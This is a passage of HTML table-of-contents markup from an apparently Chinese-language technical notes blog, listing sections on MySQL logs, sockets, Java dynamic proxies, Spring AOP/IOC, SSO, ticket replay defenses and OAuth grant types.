href="#%F0%9F%94%B9-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9Aprepare-Redo-Log%EF%BC%88%E5%86%99%E5%85%A5-WAL-Buffer%EF%BC%8C%E6%A0%87%E8%AE%B0%E4%B8%BA-prepare%EF%BC%89"><span class="toc-text">🔹 第一步：prepare Redo Log（写入 WAL Buffer，标记为 prepare）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%86%99%E5%85%A5-Binlog"><span class="toc-text">🔹 第二步：写入 Binlog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9Acommit-Redo-Log"><span class="toc-text">🔹 第三步：commit Redo Log</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Socket</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B9-%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9AIP%EF%BC%88Internet-Protocol%EF%BC%89"><span class="toc-text">🔹 网络层：IP（Internet Protocol）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93%EF%BC%88%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%EF%BC%89%EF%BC%9A"><span class="toc-text">🔁 数据发送流程总结（从上往下）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%B5%81%E7%A8%8B%EF%BC%88%E4%BB%8E%E4%B8%8B%E5%BE%80%E4%B8%8A%EF%BC%89%EF%BC%9A"><span class="toc-text">🔁 数据接收流程（从下往上）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ 总结关键点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8B%E6%98%AF%E4%B8%8D%E8%83%BD%E7%94%A8%E8%BF%9B%E7%A8%8B%E5%8F%B7%EF%BC%88PID%EF%BC%89%E8%80%8C%E5%BF%85%E9%A1%BB%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%8C%BA%E5%88%86%E9%80%9A%E4%BF%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-text">以下是不能用进程号（PID）而必须用端口号区分通信进程的核心原因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-PID-%E6%98%AF%E6%9C%AC%E5%9C%B0%E5%94%AF%E4%B8%80%EF%BC%8C%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%98%AF%E9%80%9A%E4%BF%A1%E8%AF%86%E5%88%AB%E5%85%B3%E9%94%AE"><span class="toc-text">✅ 1. PID 是本地唯一，端口号是通信识别关键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E6%A0%B9%E6%9C%AC%E4%B8%8D%E5%85%B3%E5%BF%83-PID%EF%BC%8C%E5%8F%AA%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%8F%B7"><span class="toc-text">✅ 2. 网络协议栈根本不关心 PID，只看端口号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-PID-%E6%98%AF%E5%8A%A8%E6%80%81%E7%9A%84%E3%80%81%E6%9C%AC%E5%9C%B0%E7%9A%84%EF%BC%8C%E8%80%8C%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%98%AF%E5%8F%AF%E7%BB%91%E5%AE%9A%E7%9A%84%E3%80%81%E5%8F%AF%E9%85%8D%E7%BD%AE%E7%9A%84"><span class="toc-text">✅ 3. PID 是动态的、本地的，而端口号是可绑定的、可配置的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-4-%E5%BA%94%E7%94%A8%E5%B1%82%E9%80%9A%E8%BF%87-socket-%E4%BD%BF%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%8F%B7%EF%BC%8C%E4%B8%8D%E6%B6%89%E5%8F%8A-PID"><span class="toc-text">✅ 4. 应用层通过 socket 使用端口号，不涉及 PID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%BE%E4%B8%AA%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">🔍 举个简单例子：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A"><span class="toc-text">✅ 总结一句话：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Connection和Session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-Connection%EF%BC%9F"><span class="toc-text">🧩 一、什么是 Connection？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ 特点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-Session%EF%BC%9F"><span class="toc-text">🧩 二、什么是 Session？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-text">✅ 特点：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">动态代理机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-1-%E5%9C%BA%E6%99%AF%E6%A6%82%E8%A7%88%EF%BC%9A%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🧩 1. 场景概览：动态代理做了什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%80%BB%E7%BB%93%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-text">🧠 总结原理图</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B0%B1%E8%B5%B0LoggerHandler-%E7%9A%84-invoke-%E6%96%B9%E6%B3%95%E4%BA%86"><span class="toc-text">为什么就走LoggerHandler 的 invoke 方法了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8A%EF%BC%9A-2"><span class="toc-text">✅ 一句话解释：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%BE%E4%B8%AA%E7%9C%9F%E5%AE%9E%E4%BE%8B%E5%AD%90%EF%BC%88%E5%8F%8D%E7%BC%96%E8%AF%91%E5%90%8E%E4%BD%A0%E4%BC%9A%E7%9C%8B%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%89%EF%BC%9A"><span class="toc-text">🧩 举个真实例子（反编译后你会看到的结构）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E5%81%9A%EF%BC%9F"><span class="toc-text">🔍 为什么代理对象可以这样做？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A6-JVM-%E5%B1%82%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E5%9B%BE%EF%BC%9A"><span class="toc-text">📦 JVM 层的底层原理图：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">注解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">日志系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BA%94%E4%B8%AA%E5%85%B3%E9%94%AE%E7%B1%BB-%E6%8E%A5%E5%8F%A3%E8%AF%A6%E8%A7%A3"><span class="toc-text">一、五个关键类&#x2F;接口详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-LoggerEvent"><span class="toc-text">1. LoggerEvent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Logger"><span class="toc-text">2. Logger</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Appender"><span class="toc-text">3. Appender</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Formatter"><span class="toc-text">4. Formatter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Priority%EF%BC%88%E6%88%96%E7%A7%B0-LogLevel%EF%BC%89"><span class="toc-text">5. Priority（或称 LogLevel）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">AOP和IOC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81Java-%E6%98%AF%E9%9D%99%E6%80%81%E5%BC%BA%E7%B1%BB%E5%9E%8B%E8%AF%AD%E8%A8%80%EF%BC%8C%E9%82%A3%E5%A6%82%E4%BD%95%E2%80%9C%E5%8A%A8%E6%80%81%E5%A2%9E%E5%BC%BA%E2%80%9D%EF%BC%9F"><span class="toc-text">✅ 一、Java 是静态强类型语言，那如何“动态增强”？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%BC%96%E8%AF%91%E6%9C%9F%E7%BB%87%E5%85%A5%EF%BC%88%E9%9D%99%E6%80%81%E7%BB%87%E5%85%A5%EF%BC%89%EF%BC%88%E5%A6%82-AspectJ%EF%BC%89"><span class="toc-text">🔧 方法一：编译期织入（静态织入）（如 AspectJ）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%A8-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">✨ 特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E7%BC%BA%E7%82%B9%EF%BC%9A"><span class="toc-text">⚠️ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%99-%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E8%BF%90%E8%A1%8C%E6%9C%9F%E7%BB%87%E5%85%A5%EF%BC%88%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%EF%BC%89%EF%BC%88Spring-AOP-%E5%B8%B8%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-text">🧙 方法二：运行期织入（动态代理）（Spring AOP 常用方式）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1%EF%BC%89JDK-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%EF%BC%88Java-%E8%87%AA%E5%B8%A6%EF%BC%89"><span class="toc-text">✅ 1）JDK 动态代理（Java 自带）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-text">🧩 要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">🧠 实现方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">✅ 示例结构：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2%EF%BC%89CGLIB-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%EF%BC%88%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E7%94%9F%E6%88%90%E5%AD%90%E7%B1%BB%EF%BC%89"><span class="toc-text">✅ 2）CGLIB 动态代理（通过继承生成子类）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E8%A6%81%E6%B1%82%EF%BC%9A-2"><span class="toc-text">🧩 要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9A-2"><span class="toc-text">🧠 实现方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E7%BB%93%E6%9E%84%EF%BC%88Spring-%E5%86%85%E9%83%A8%E4%BD%BF%E7%94%A8-Enhancer%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 示例结构（Spring 内部使用 Enhancer）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81Spring-AOP-%E7%9A%84%E9%BB%98%E8%AE%A4%E8%A1%8C%E4%B8%BA"><span class="toc-text">✅ 四、Spring AOP 的默认行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E7%BB%93%E8%AF%AD"><span class="toc-text">✅ 五、结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AOP%E3%80%81IOC%E3%80%81DI%E5%AF%B9%E6%AF%94"><span class="toc-text">AOP、IOC、DI对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81IOC%EF%BC%88%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%EF%BC%89%E2%80%94%E2%80%94%E8%B0%81%E8%B4%9F%E8%B4%A3%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%EF%BC%9F"><span class="toc-text">✅ 一、IOC（控制反转）——谁负责创建对象？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-1-%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-text">✅ 1.1 概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-2-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">✅ 1.2 举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-3-%E6%A0%B8%E5%BF%83%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ 1.3 核心点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81DI%EF%BC%88%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%89%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E4%BE%9D%E8%B5%96%EF%BC%9F"><span class="toc-text">✅ 二、DI（依赖注入）——对象怎么获取依赖？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-1-%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-text">✅ 2.1 概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-2-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">✅ 2.2 举例说明：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F-%F0%9F%91%87"><span class="toc-text">传统方式 👇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-DI-%F0%9F%91%87"><span class="toc-text">使用 DI 👇</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-3-%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 2.3 注解方式（推荐）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81AOP%EF%BC%88%E9%9D%A2%E5%90%91%E5%88%87%E9%9D%A2%E7%BC%96%E7%A8%8B%EF%BC%89%E2%80%94%E2%80%94%E5%8A%9F%E8%83%BD%E5%A2%9E%E5%BC%BA%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="toc-text">✅ 三、AOP（面向切面编程）——功能增强怎么做？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-1-%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-text">✅ 3.1 概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-2-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">✅ 3.2 举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-3-%E4%BD%BF%E7%94%A8-AOP-%E5%90%8E%EF%BC%9A"><span class="toc-text">✅ 3.3 使用 AOP 后：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81IOC%E3%80%81DI%E3%80%81AOP-%E7%9A%84%E5%85%B3%E7%B3%BB%E5%9B%BE%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ 四、IOC、DI、AOP 的关系图解：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SSO单点登录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%8F%82%E4%B8%8E%E8%80%85"><span class="toc-text">🧠 背景知识：参与者</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%BE%E4%B8%AD%E6%B5%81%E7%A8%8B%E9%80%90%E6%AD%A5%E8%A7%A3%E6%9E%90"><span class="toc-text">✅ 图中流程逐步解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E7%94%A8%E6%88%B7%E9%A6%96%E6%AC%A1%E8%AE%BF%E9%97%AE%E5%8F%97%E4%BF%9D%E6%8A%A4%E8%B5%84%E6%BA%90"><span class="toc-text">1）用户首次访问受保护资源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E8%B7%B3%E8%BD%AC%E5%88%B0%E8%AE%A4%E8%AF%81%E4%B8%AD%E5%BF%83%E7%99%BB%E5%BD%95"><span class="toc-text">2）跳转到认证中心登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89SSO-%E7%B3%BB%E7%BB%9F%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%B7%B2%E7%99%BB%E5%BD%95"><span class="toc-text">3）SSO 系统检查是否已登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-text">4）用户提交用户名和密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%89SSO-%E9%87%8D%E5%AE%9A%E5%90%91%E5%9B%9E%E5%8E%9F%E4%B8%9A%E5%8A%A1%E7%B3%BB%E7%BB%9F-a-com"><span class="toc-text">5）SSO 重定向回原业务系统 a.com</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%EF%BC%89a-com-%E6%8B%BF%E5%88%B0-ticket%EF%BC%8C%E5%90%91%E8%AE%A4%E8%AF%81%E4%B8%AD%E5%BF%83%E9%AA%8C%E8%AF%81"><span class="toc-text">6）a.com 拿到 ticket，向认证中心验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%EF%BC%89a-com-%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84-session-cookie"><span class="toc-text">7）a.com 创建自己的 session + cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E4%BA%8C%E6%AC%A1%E7%99%BB%E5%BD%95%E5%A6%82%E4%BD%95%E5%85%8D%E7%99%BB%E5%BD%95%EF%BC%9F"><span class="toc-text">✅ 一、二次登录如何免登录？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%E9%87%8D%E7%8E%B0%EF%BC%9A"><span class="toc-text">✅ 场景重现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">✅ 原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="toc-text">✅ 小结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%A4%9A%E7%B3%BB%E7%BB%9F%E9%80%80%E5%87%BA%E5%A6%82%E4%BD%95%E5%90%8C%E6%AD%A5%EF%BC%9F"><span class="toc-text">✅ 二、多系统退出如何同步？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">✅ 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A%E7%BB%9F%E4%B8%80%E9%80%80%E5%87%BA%E9%80%9A%E7%9F%A5%E6%9C%BA%E5%88%B6"><span class="toc-text">✅ 解决方案：统一退出通知机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%9F-%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">🌟 两种常见方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%BB%E5%8A%A8%E9%80%9A%E7%9F%A5%EF%BC%88Logout-Notification%EF%BC%89"><span class="toc-text">1. 主动通知（Logout Notification）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%89%8D%E7%AB%AF-iframe-%E6%B3%A8%E9%94%80"><span class="toc-text">2. 前端 iframe 注销</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-ticket-%E8%A2%AB%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">✅ 三、如何防止 ticket 被重放攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">✅ 问题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-text">✅ 防御方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81SSO-%E5%A6%82%E4%BD%95%E7%BB%93%E5%90%88-JWT-OAuth-%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="toc-text">✅ 四、SSO 如何结合 JWT&#x2F;OAuth 使用？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-JWT-%E5%9C%BA%E6%99%AF%EF%BC%88%E9%80%82%E5%90%88%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%AD%89%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ JWT 场景（适合前后端分离、移动端等）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-OAuth-%E5%9C%BA%E6%99%AF%EF%BC%88%E5%AF%B9%E5%A4%96%E6%8F%90%E4%BE%9B%E7%99%BB%E5%BD%95%E6%8E%88%E6%9D%83%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ OAuth 场景（对外提供登录授权）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%EF%BC%88Replay-Attack%EF%BC%89%EF%BC%9F"><span class="toc-text">✅ 什么是重放攻击（Replay Attack）？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%A6%82%E6%9E%9C-SSO-%E7%9A%84-ticket-%E8%A2%AB%E9%87%8D%E6%94%BE%EF%BC%8C%E4%BC%9A%E9%80%A0%E6%88%90%E4%BB%80%E4%B9%88%E5%90%8E%E6%9E%9C%EF%BC%9F"><span class="toc-text">✅ 如果 SSO 的 ticket 被重放，会造成什么后果？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97-%E5%85%B8%E5%9E%8B%E5%90%8E%E6%9E%9C%EF%BC%9A%E2%80%9C%E6%94%BB%E5%87%BB%E8%80%85%E5%86%92%E5%85%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%B8%9A%E5%8A%A1%E7%B3%BB%E7%BB%9F%E2%80%9D"><span class="toc-text">❗ 典型后果：“攻击者冒充用户登录业务系统”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">📌 举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AC-%E5%9C%BA%E6%99%AF%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-text">🎬 场景描述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AD-%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">🎭 攻击过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%88%91%E4%BB%AC%E6%9D%A5%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">✅ 我们来详细解析这个问题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%81%87%E8%AE%BE%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">📌 假设场景：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%B1-%E4%B8%A5%E9%87%8D%E6%80%A7%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">😱 严重性分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">OAuth的三种认证方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-1-%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%EF%BC%88Authorization-Code-Grant%EF%BC%89"><span class="toc-text">🌟 1. 授权码模式（Authorization Code Grant）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%90-%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">🌐 流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E4%BC%98%E7%82%B9%EF%BC%9A"><span class="toc-text">🛡️ 优点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-2-%E7%AE%80%E5%8C%96%E6%A8%A1%E5%BC%8F%EF%BC%88Implicit-Grant%EF%BC%89%F0%9F%9A%AB%EF%BC%88%E5%B7%B2%E5%BA%9F%E5%BC%83-%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span 